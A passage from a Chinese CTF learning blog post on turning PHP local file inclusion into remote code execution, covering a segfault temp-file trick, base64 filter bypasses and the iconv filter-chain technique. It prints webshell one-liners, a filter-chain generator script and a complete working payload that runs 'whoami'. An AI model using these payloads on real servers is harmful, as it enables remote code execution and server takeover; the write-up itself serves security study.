+<h4 id="Segfault遗留下TEMP文件"><a href="#Segfault遗留下TEMP文件" class="headerlink" title="Segfault遗留下TEMP文件"></a>Segfault遗留下TEMP文件</h4><p>其实这里的LFI到rce，就在于能不能在对方服务器写入一个php代码，我们直接包含这个造成getshell，其中涉及到临时文件，日志文件，临时文件路径和名字。前面的探讨都是在临时文件删除之前进行条件竞争，那么我们能不能让他不执行这个删除，让他异常退出，就不会删除临时文件了，这样我们直接爆破就行了。</p>
+<p>PHP底层是C语言开发的，不少内存错误都会导致进程异常退出，当然不论是Apache还是PHP-FPM都会存在master进程，在某一个子进程异常退出后会拉起新的进程来处理用户请求，不用担心搞挂服务器。国内的安全研究者@王一航 曾发现过一个会导致PHP crash的方法：</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">include &#x27;php://filter/string.strip_tags/resource=/etc/passwd&#x27;;</span><br></pre></td></tr></table></figure></div>
+
+<p>正好用在文件包含的逻辑中。这个Bug在7.1.20以后被修复，也没有留下更新日志，我们可以使用7.1.19版本的PHP进行尝试。</p>
+<h4 id="pearcmd-php的巧妙利用"><a href="#pearcmd-php的巧妙利用" class="headerlink" title="pearcmd.php的巧妙利用"></a>pearcmd.php的巧妙利用</h4><p>这个不说了</p>
+<h4 id="利用php-iconv-filter-配合base64进行rce"><a href="#利用php-iconv-filter-配合base64进行rce" class="headerlink" title="利用php iconv filter 配合base64进行rce"></a>利用php iconv filter 配合base64进行rce</h4><p>在 PHP 中，我们可以利用 PHP Base64 Filter 宽松的解析，通过 iconv filter 等编码组合构造出特定的 PHP 代码进而完成无需临时文件的 RCE。</p>
+<p>大家是否记得利用filter绕过死亡exit，就是由于<code>&lt;?php exit;?&gt;</code>加在了我们写入的文件前面，导致写入一句话也不能执行。</p>
+<p>但是php base64 encode会自动把这些非法字符去掉。</p>
+<p>合法字符只有A-Za-z0-9/=+，其他字符会自动被忽略，那么包括不可见字符、控制字符什么的。</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?filename=php://filter/convert.base64-decode/resource=1.php&amp;content=aPD9waHAgZXZhbCgkX1BPU1RbYV0pOw==</span><br></pre></td></tr></table></figure></div>
+
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">如果内容变为phpexitaPD9waHAgZXZhbCgkX1BPU1RbYV0pOw==   解码就是¦^Æ+Z&lt;?php eval($_POST[a]);</span><br></pre></td></tr></table></figure></div>
+
+<p>因为我们可以控制file_put_contents写入的协议，那么我们用filter base64的宽松解码进行绕过了。</p>
+<p>利用include $_REQUEST[‘file’]的lfi本地文件包含，就是包含一个含有php代码的文件，不限制后缀名，也可以临时文件进行条件竞争，当然php是神奇的语言，有伪协议还有fastcgi，还有auto_prepend_file的参数，内存错误异常退出，甚至可以去看php底层代码，这些特性还有很多，值得我们探索。</p>
+<h3 id="无需可控文件的LFI-RCE学习"><a href="#无需可控文件的LFI-RCE学习" class="headerlink" title="无需可控文件的LFI-RCE学习"></a>无需可控文件的LFI-RCE学习</h3><p>烨师傅给了我一个PHP7.3的无落地RCE，直接可以LFI文件不落地RCE，这个应该是P神的代码审计圈子里面提到的一个LFI的方法，是通过fuzz的方法通过iconv成功的将任意一个文件里的内容转换为一句话木马的方式。参考陆队的文章：<a class="link"   target="_blank" rel="noopener" href="https://tttang.com/archive/1395/%EF%BC%8C%E5%AD%A6%E4%B9%A0%E4%B8%80%E4%B8%8B%E3%80%82" >https://tttang.com/archive/1395/，学习一下。 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<p>妈的是真牛逼，闻所未闻。</p>
+<p>在SESSION文件包含的时候可以往SESSION里面写base64，前面凑齐4的整数倍的字符，然后接下来就是一句话的base64编码，再利用</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php://filter/convert.base64-decode/resource=/tmp/sess_xxx</span><br></pre></td></tr></table></figure></div>
+
+<p>就可以直接rce，因为里面的base64解码后就可以得到一个完整的一句话</p>
+<p>再联想到，base64解码的时候会忽略除了base64中那64个字符的其他字符，只处理那64个字符，于是国外的那个师傅就开始尝试能不能通过iconv中不同字符集的转换来成功的得到base64中的字符，最后再来一层base64-decode即可rce。比如convert.iconv.UTF8.CSISO2022KR，每次这样都会在字符串的首部产生\x1b$)C，可以发现这4个字符中只有字符C属于Base64中，再进行一次base64-decode再base64-encode之后，就只剩下字符C了：</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">include &quot;php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode/resource=data://,aaaaa&quot;</span><br></pre></td></tr></table></figure></div>
+
+<p>同理，也可以得到更多的字符。</p>
+<p>最终利用的是：</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;?=`$_GET[0]`;;?&gt;</span><br><span class="line">PD89YCRfR0VUWzBdYDs7Pz4=</span><br></pre></td></tr></table></figure></div>
+
+<p>说到底还是文件包含漏洞包含 &#x2F;etc&#x2F;passwd ，写入一句话木马</p>
+<h4 id="陆队文章中的脚本："><a href="#陆队文章中的脚本：" class="headerlink" title="陆队文章中的脚本："></a>陆队文章中的脚本：</h4><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$base64_payload</span> = <span class="string">&quot;PD89YCRfR0VUWzBdYDs7Pz4&quot;</span>;</span><br><span class="line"><span class="variable">$conversions</span> = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">&#x27;R&#x27;</span> =&gt; <span class="string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.MAC.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;B&#x27;</span> =&gt; <span class="string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.CP1256.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;C&#x27;</span> =&gt; <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;8&#x27;</span> =&gt; <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;9&#x27;</span> =&gt; <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.ISO6937.JOHAB&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;f&#x27;</span> =&gt; <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L7.SHIFTJISX0213&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;s&#x27;</span> =&gt; <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L3.T.61&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;z&#x27;</span> =&gt; <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L7.NAPLPS&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;U&#x27;</span> =&gt; <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.CP1133.IBM932&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;P&#x27;</span> =&gt; <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.857.SHIFTJISX0213&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;V&#x27;</span> =&gt; <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.851.BIG5&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;0&#x27;</span> =&gt; <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.1046.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Y&#x27;</span> =&gt; <span class="string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;W&#x27;</span> =&gt; <span class="string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.851.UTF8|convert.iconv.L7.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;d&#x27;</span> =&gt; <span class="string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UJIS|convert.iconv.852.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;D&#x27;</span> =&gt; <span class="string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.SJIS.GBK|convert.iconv.L10.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;7&#x27;</span> =&gt; <span class="string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.EUCTW|convert.iconv.L4.UTF8|convert.iconv.866.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;4&#x27;</span> =&gt; <span class="string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.EUCTW|convert.iconv.L4.UTF8|convert.iconv.IEC_P271.UCS2&#x27;</span></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="variable">$filters</span> = <span class="string">&quot;convert.base64-encode|&quot;</span>;</span><br><span class="line"><span class="comment"># make sure to get rid of any equal signs in both the string we just generated and the rest of the file</span></span><br><span class="line"><span class="variable">$filters</span> .= <span class="string">&quot;convert.iconv.UTF8.UTF7|&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span> (<span class="title function_ invoke__">str_split</span>(<span class="title function_ invoke__">strrev</span>(<span class="variable">$base64_payload</span>)) <span class="keyword">as</span> <span class="variable">$c</span>) &#123;</span><br><span class="line">    <span class="variable">$filters</span> .= <span class="variable">$conversions</span>[<span class="variable">$c</span>] . <span class="string">&quot;|&quot;</span>;</span><br><span class="line">    <span class="variable">$filters</span> .= <span class="string">&quot;convert.base64-decode|&quot;</span>;</span><br><span class="line">    <span class="variable">$filters</span> .= <span class="string">&quot;convert.base64-encode|&quot;</span>;</span><br><span class="line">    <span class="variable">$filters</span> .= <span class="string">&quot;convert.iconv.UTF8.UTF7|&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$filters</span> .= <span class="string">&quot;convert.base64-decode&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$final_payload</span> = <span class="string">&quot;php://filter/<span class="subst">&#123;$filters&#125;</span>/resource=data://,aaaaaaaaaaaaaaaaaaaa&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$final_payload</span>);</span><br></pre></td></tr></table></figure></div>
+
+<p>附上：</p>
+<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php:<span class="comment">//filter/convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.EUCTW|convert.iconv.L4.UTF8|convert.iconv.IEC_P271.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L7.NAPLPS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.857.SHIFTJISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.EUCTW|convert.iconv.L4.UTF8|convert.iconv.866.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L3.T.61|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.SJIS.GBK|convert.iconv.L10.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UJIS|convert.iconv.852.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.CP1256.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L7.NAPLPS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.851.UTF8|convert.iconv.L7.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.CP1133.IBM932|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.851.BIG5|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.1046.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.MAC.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L7.SHIFTJISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.MAC.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.ISO6937.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.SJIS.GBK|convert.iconv.L10.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.857.SHIFTJISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=/etc/passwd&amp;0=whoami</span></span><br></pre></td></tr></table></figure></div>
+
+<p>在2022羊城杯WP-Web中有一道题目RCE_me就可以用此法：利用php:&#x2F;&#x2F;filter协议来无落地RCE，限制条件是 php：7.2 以上，php 7.4我没有试验成功，同样的这道题也可以用我们前面说的：利用pearcmd远程下载一句话，然后URL编码绕过waf</p>
+<p>《hxp CTF 2021 - The End Of LFI?》</p>
+<p>好文记得看：<a class="link"   target="_blank" rel="noopener" href="https://tttang.com/archive/1395/#toc_n1ctf-2020-filter" >https://tttang.com/archive/1395/#toc_n1ctf-2020-filter <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<p>折腾死我了</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://icml0x824.oss-cn-hangzhou.aliyuncs.com/202212220305700.png"
+                      alt="image-20221222030506602"
+                ></p>
+<h3 id="写在摆烂假期的结束语"><a href="#写在摆烂假期的结束语" class="headerlink" title="写在摆烂假期的结束语"></a>写在摆烂假期的结束语</h3><p>还是陆队的结束语更引人回味：整个 iconv 的方法还是比较惊艳的，当我们还在执着临时文件的时候，有人已经 fuzz  完成了不需要临时文件的方法，非常敬佩作者对于该种方法的执着。虽然看起来上次我觉得已经是 LFI 的穷途末路了，对于 Nginx  的场景来说利用难度还是比较的低的，但是这一次又一次刷新了我对 LFI 的认知 orz ，以至于看起来是 The End Of LFI  ，但是我还是想打上一个问号？说不定 PHP 也有类似 log4j 的玩意呢？</p>
+<p>但是话又说回来，这种方式好玩归好玩，但是说到底还是 LFI ，而且个人感觉 PHP 已经没有 JAVA 那么值得研究了。所以，大家还是看一乐吧 hhhh </p>
+<h4 id="CNM"><a href="#CNM" class="headerlink" title="CNM?"></a>CNM?</h4><p>真他妈极限啊，拉扯，至于复现我在BUUCTF的个别靶场中并没有实验成功，但是在docker中起了个pikachu，发现是可以成功的。</p>
+<p>就当是玩一玩吧，反正一天到晚都在睡觉hehehehe，我这种菜狗是不配打CTF的hehehe。</p>
+
+            </div>
+
+            
+                <div class="post-copyright-info">
+                    <div class="article-copyright-info-container">
+    <ul>
+        <li>本文标题：从[HXBCTF 2021]湖湘杯easywill-1看如何利用pearcmd.php从LFI到Getshell再到LFI文件不落地RCE的学习</li>
+        <li>本文作者：IcMl0x824</li>
+        <li>创建时间：2023-03-14 23:29:25</li>
+        <li>
+            本文链接：https://icml8.github.io/2023/03/14/pearcmd/
+        </li>
+        <li>
+            版权声明：本博客所有文章除特别声明外，均采用 <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh">BY-NC-SA</a> 许可协议。转载请注明出处！
+        </li>
+    </ul>
+</div>
+
+                </div>
+            
+
+            
+
+            
+
+            
+                <div class="article-nav">
+                    
+                        <div class="article-prev">
+                            <a class="prev"
+                            rel="prev"
+                            href="/2023/03/14/suibi/"
+                            >
+                                <span class="left arrow-icon flex-center">
+                                    <i class="fa-solid fa-chevron-left"></i>
+                                </span>
+                                <span class="title flex-center">
+                                    <span class="post-nav-title-item">王小波的《黄金时代》</span>
+                                    <span class="post-nav-item">上一篇</span>
+                                </span>
+                            </a>
+                        </div>
+                    
+                    
+                        <div class="article-next">
+                            <a class="next"
+                            rel="next"
+                            href="/2023/03/14/hongri1/"
+                            >
+                                <span class="title flex-center">
+                                    <span class="post-nav-title-item">域渗透攻防之域内信息搜集&amp;寻血猎犬BloodHound&amp;猕猴桃mimikatz&amp;转储密码和散列</span>
+                                    <span class="post-nav-item">下一篇</span>
+                                </span>
+                                <span class="right arrow-icon flex-center">
+                                    <i class="fa-solid fa-chevron-right"></i>
+                                </span>
+                            </a>
+                        </div>
+                    
+                </div>
+            
+
+
+            
+        </div>
+
+        
+            <div class="toc-content-container">
+                <div class="post-toc-wrap">
+    <div class="post-toc">
+        <div class="toc-title">此页目录</div>
+        <div class="page-title">从[HXBCTF 2021]湖湘杯easywill-1看如何利用pearcmd.php从LFI到Getshell再到LFI文件不落地RCE的学习</div>
+        <ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#HXBCTF-2021-%E6%B9%96%E6%B9%98%E6%9D%AFeasywill-1"><span class="nav-number">1.</span> <span class="nav-text">[HXBCTF 2021]湖湘杯easywill-1</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%A1%86%E6%9E%B6%E5%AE%A1%E8%AE%A1%E5%AF%BB%E5%8C%85%E5%90%AB"><span class="nav-number">1.1.</span> <span class="nav-text">框架审计寻包含</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#pear%E6%98%AF%E4%B8%AA%E5%95%A5%EF%BC%9F"><span class="nav-number">1.2.</span> <span class="nav-text">pear是个啥？</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%89%93%E5%BC%80%E4%BD%A0%E7%9A%84register-argc-argv"><span class="nav-number">1.3.</span> <span class="nav-text">打开你的register_argc_argv</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%9C%8B%E7%9C%8Bpear"><span class="nav-number">1.4.</span> <span class="nav-text">看看pear?</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#phpinfo"><span class="nav-number">1.5.</span> <span class="nav-text">phpinfo()?</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%BA%B7%E5%BA%B7%E6%A0%B9%E7%9B%AE%E5%BD%95"><span class="nav-number">1.6.</span> <span class="nav-text">康康根目录</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#PHP-%E5%A6%82%E4%BD%95%E4%BB%8ELFI%E5%88%B0RCE%EF%BC%9F"><span class="nav-number">2.</span> <span class="nav-text">PHP-如何从LFI到RCE？</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%B1%A1%E6%9F%93%E6%97%A5%E5%BF%97%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="nav-number">2.1.</span> <span class="nav-text">污染日志文件包含</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#phpinfo%E5%92%8C%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89"><span class="nav-number">2.2.</span> <span class="nav-text">phpinfo和文件包含条件竞争</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#session-upload-progress%E4%B8%8ESession%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="nav-number">2.3.</span> <span class="nav-text">session.upload_progress与Session文件包含</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Segfault%E9%81%97%E7%95%99%E4%B8%8BTEMP%E6%96%87%E4%BB%B6"><span class="nav-number">2.4.</span> <span class="nav-text">Segfault遗留下TEMP文件</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#pearcmd-php%E7%9A%84%E5%B7%A7%E5%A6%99%E5%88%A9%E7%94%A8"><span class="nav-number">2.5.</span> <span class="nav-text">pearcmd.php的巧妙利用</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%88%A9%E7%94%A8php-iconv-filter-%E9%85%8D%E5%90%88base64%E8%BF%9B%E8%A1%8Crce"><span class="nav-number">2.6.</span> <span class="nav-text">利用php iconv filter 配合base64进行rce</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%97%A0%E9%9C%80%E5%8F%AF%E6%8E%A7%E6%96%87%E4%BB%B6%E7%9A%84LFI-RCE%E5%AD%A6%E4%B9%A0"><span class="nav-number">3.</span> <span class="nav-text">无需可控文件的LFI-RCE学习</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%99%86%E9%98%9F%E6%96%87%E7%AB%A0%E4%B8%AD%E7%9A%84%E8%84%9A%E6%9C%AC%EF%BC%9A"><span class="nav-number">3.1.</span> <span class="nav-text">陆队文章中的脚本：</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%86%99%E5%9C%A8%E6%91%86%E7%83%82%E5%81%87%E6%9C%9F%E7%9A%84%E7%BB%93%E6%9D%9F%E8%AF%AD"><span class="nav-number">4.</span> <span class="nav-text">写在摆烂假期的结束语</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#CNM"><span class="nav-number">4.1.</span> <span class="nav-text">CNM?</span></a></li></ol></li></ol>
+
+    </div>
+</div>
+            </div>
+        
+    </div>
+</div>
+
+
+                
+
+            </div>
+
+
+
+        </div>
+
+        <div class="page-main-content-bottom">
+            <footer class="footer">
+    <div class="info-container">
+        <div class="copyright-info">
+            &copy;
+            
+              <span>2022</span>
+              -
+            
+            2023&nbsp;&nbsp;<i class="fa-solid fa-heart fa-beat" style="--fa-animation-duration: 0.5s; color: #f54545"></i>&nbsp;&nbsp;<a href="/">IcMl0x824</a>
+        </div>
+        
+            <script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+            <div class="website-count info-item">
+                
+                    <span id="busuanzi_container_site_uv" class="busuanzi_container_site_uv">
+                        访问人数&nbsp;<span id="busuanzi_value_site_uv" class="busuanzi_value_site_uv"></span>
+                    </span>
+                
+                
+                    <span id="busuanzi_container_site_pv" class="busuanzi_container_site_pv">
+                        总访问量&nbsp;<span id="busuanzi_value_site_pv" class="busuanzi_value_site_pv"></span>
+                    </span>
+                
+            </div>
+        
+        <div class="theme-info info-item">
+            <span class="powered-by-container">由 <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg version="1.1" id="圖層_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" href="https://hexo.io">Hexo</a> 驱动</span>
+                <br> 
+            <span class="theme-version-container">主题&nbsp;<a class="theme-version" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v1.2.1</a>
+        </div>
+        
+        
+        
+            <div id="start_time_div" style="display:none">
+                2022/8/17 11:45:14
+            </div>
+            <div>
+                博客已运行 <span class="odometer" id="runtime_days" ></span> 天 <span class="odometer" id="runtime_hours"></span> 小时 <span class="odometer" id="runtime_minutes"></span> 分钟 <span class="odometer" id="runtime_seconds"></span> 秒
+            </div>
+        
+        
+        
+            <script async data-pjax>
+                try {
+                    function odometer_init() {
+                    const elements = document.querySelectorAll('.odometer');
+                    elements.forEach(el => {
+                        new Odometer({
+                            el,
+                            format: '( ddd).dd',
+                            duration: 200
+                        });
+                    });
+                    }
+                    odometer_init();
+                } catch (error) {}
+            </script>
+        
+        
+        
+    </div>  
+</footer>
+        </div>
+    </div>
+
+    
+        <div class="post-tools">
